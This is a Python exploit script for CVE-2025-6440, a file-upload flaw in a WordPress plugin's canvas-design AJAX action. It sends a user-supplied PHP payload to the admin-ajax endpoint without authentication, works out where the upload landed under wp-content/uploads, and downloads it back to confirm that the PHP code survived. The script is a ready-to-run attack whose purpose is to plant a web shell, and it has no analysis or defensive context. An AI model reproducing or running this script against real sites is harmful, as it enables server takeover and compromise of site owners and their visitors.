#!/usr/bin/env python3                                                                           import argparse
import urllib3
import json
import os
import secrets
import sys
from urllib.parse import urljoin
from colorama import Fore, Style, init
import mimetypes
import requests
from io import BytesIO

def norm(base: str) -> str:
    if not base.startswith(("http://", "https://")):
        base = "http://" + base
    return base.rstrip("/") + "/"

def ajax_url(base: str) -> str:
    return urljoin(base, "wp-admin/admin-ajax.php")

def uploads_base(base: str) -> str:
    return urljoin(base, "wp-content/uploads/")
                                                                                                 def is_png(b: bytes) -> bool:
    return b.startswith(b'\x89PNG\r\n\x1a\n')

def contains_php(b: bytes) -> bool:
    return b.find(b'<?php') != -1 or b.find(b'<?=') != -1

def extract_php_from_bytes(b: bytes):
    idx = b.find(b'<?php')
    if idx == -1:
        idx = b.find(b'<?=')
        if idx == -1:                                                                                        return -1, b''                                                                           return idx, b[idx:]                                                                          
def upload_file(base: str, uniq: str, file_bytes: bytes, fname: str, mime: str, timeout=20.0, verbose=False):
    target = ajax_url(base)
    action = "wcdp_save_canvas_design_ajax"
    field = "0"

    params = {                                                                                           "mode": "addtocart",
        "uniq": uniq,
        "editor": "frontend",
        "designID": 0,
        "productID": 0,
        "addCMYK": False,
        "saveList": False,
        "productData": 0,
        "files": [{"count": field, "name": os.path.splitext(fname)[0], "ext": os.path.splitext(fname)[1].lstrip(".")}],
    }
    data = {"action": action, "params": json.dumps(params, separators=(",", ":"))}                   files = {field: (fname, file_bytes, mime)}
    headers = {                                                                                          "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, */*;q=0.1",
        "Connection": "close",
        "Referer": base,
        "X-Requested-With": "XMLHttpRequest",
    }

    if verbose:
        print(f"\n[VERBOSE] Upload target: {target}")
        print("[VERBOSE] Data fields:", json.dumps(data, indent=2))
        print("[VERBOSE] File field:", field, "->", fname, f"({len(file_bytes)} bytes, {mime})")
        print("[VERBOSE] Headers:", json.dumps(headers, indent=2))

    try:
        resp = requests.post(target, data=data, files=files, headers=headers,
                             timeout=timeout, allow_redirects=True, verify=False)
        if verbose:
            print(f"[VERBOSE] HTTP Response: {resp.status_code}")
            print(f"[VERBOSE] Response length: {len(resp.text)}")
        return resp
    except Exception as e:
        print("[!] Upload request failed:", e)
        return None

def check_remote(public_url: str, save_copy: str = None, timeout: float = 11.0, verbose=False):
    try:
        r = requests.get(public_url, timeout=timeout, allow_redirects=True, verify=False)
    except Exception as e:
        print("[!] Remote GET failed:", e)
        return None                                                                                  info = {
        "status_code": r.status_code,
        "content_type": r.headers.get("Content-Type", ""),
        "body_bytes": r.content
    }
    if save_copy:
        try:
            with open(save_copy, "wb") as fh:
                fh.write(r.content)
            if verbose:
                print(f"[VERBOSE] Saved remote copy to {save_copy}")
        except Exception as e:
            print("[!] Could not write save_copy:", e)
    return info

def main():
    parser = argparse.ArgumentParser(description="")
    parser.add_argument("--url", required=True, help="")
    parser.add_argument("--file", required=True, help="payload file.php")
    parser.add_argument("--verbose", action="store_true", help="Enable detailed debug output")
    args = parser.parse_args()

    base = norm(args.url)
    if not os.path.exists(args.file):
        print("[!] File not found:", args.file)
        sys.exit(1)

    with open(args.file, "rb") as fh:
        file_bytes = fh.read()

    name_on_upload = os.path.basename(args.file)
    mime_guess, _ = mimetypes.guess_type(name_on_upload)
    mime = mime_guess or "application/octet-stream"

    uniq = secrets.token_hex(6)
    print("[*] Base:", base)
    print("[*] uniq:", uniq)
    print("[*] Uploading file:", args.file, "->", name_on_upload, "MIME:", mime)

    resp = upload_file(base, uniq, file_bytes, name_on_upload, mime, verbose=args.verbose)
    if resp is None:
        print("[!] upload failed")
        sys.exit(2)

    print(f"HTTP {resp.status_code} len={len(resp.text or '')}")                                     public_from_json = None
    try:
        j = resp.json()
        if args.verbose:
            print("[VERBOSE] JSON Response:", json.dumps(j, indent=2))
        if isinstance(j, dict):
            for v in j.values():
                if isinstance(v, str) and ("/wp-content/" in v or v.endswith(name_on_upload)):
                    public_from_json = v
                    break
    except Exception:
        if args.verbose:
            print("[VERBOSE] Response text (first 400 chars):")
            print((resp.text or "")[:400])

    if public_from_json:
        public = public_from_json if public_from_json.startswith(("http://", "https://")) else urljoin(base, public_from_json.lstrip("/"))
    else:
        public = urljoin(uploads_base(base), f"wcdp-uploads/temp/{uniq}/{name_on_upload}")

    print("[*] Public URL:", public)
                                                                                                     out_download = f"downloaded_{uniq}.bin"
    info = check_remote(public, save_copy=out_download, verbose=args.verbose)
    if info is None:
        print("[!] Could not fetch remote file")
        sys.exit(1)

    print("[*] remote status:", info["status_code"])
    print("[*] remote content-type:", info["content_type"])
    body = info["body_bytes"]

    if is_png(body):                                                                                     print("[+] Remote file starts with PNG signature")
    else:
        print("[!] Remote file does NOT start with PNG signature")

    if contains_php(body):
        print("[!] Remote file contains PHP tag(s) - suspicious")
        idx, extracted = extract_php_from_bytes(body)
        if idx >= 0:
            outname = f"extracted_{uniq}.php"
            with open(outname, "wb") as fh:
                fh.write(extracted)
            print("[*] Extracted php to:", outname, "(offset:", idx, ")")
    else:
        print("[+] No PHP tags found in remote file")

    print("[*] Saved remote copy as:", out_download)
    if is_png(body):
        print("[*] You can open it in an image viewer (should match your uploaded file).")
                                                                                                 if __name__ == "__main__":

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    init(autoreset=True)

    BANNER = r"""[ CVE-2025-6440 BY PWDNX1337 ]"""
    print(Fore.GREEN + Style.BRIGHT + BANNER + Style.RESET_ALL)

    main()
